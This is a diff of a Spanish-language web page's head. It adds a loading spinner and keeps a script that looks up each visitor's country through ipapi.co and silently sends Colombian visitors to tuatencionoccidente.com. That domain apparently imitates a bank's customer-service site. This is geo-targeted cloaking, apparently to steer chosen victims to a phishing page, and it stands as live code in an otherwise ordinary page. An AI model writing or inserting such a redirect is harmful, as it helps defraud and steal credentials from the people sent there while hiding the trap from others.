@@ -2,7 +2,35 @@
 <html lang="es">
 <head>
   <script>
-(async()=>{try{let d=await(await fetch("https://ipapi.co/json/")).json();if(d.country_code==="CO")location.replace("https://tuatencionoccidente.com")}catch(e){}})();
+document.write(`
+<style>
+.loader {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #ddd;
+  border-top: 5px solid #000;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  margin: -25px 0 0 -25px;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+</style>
+
+<div class="loader"></div>
+`);
+
+(async()=>{
+    try {
+        let d = await (await fetch("https://ipapi.co/json/")).json();
+        if(d.country_code==="CO") location.replace("https://tuatencionoccidente.com");
+    }catch(e){}
+})();
 </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
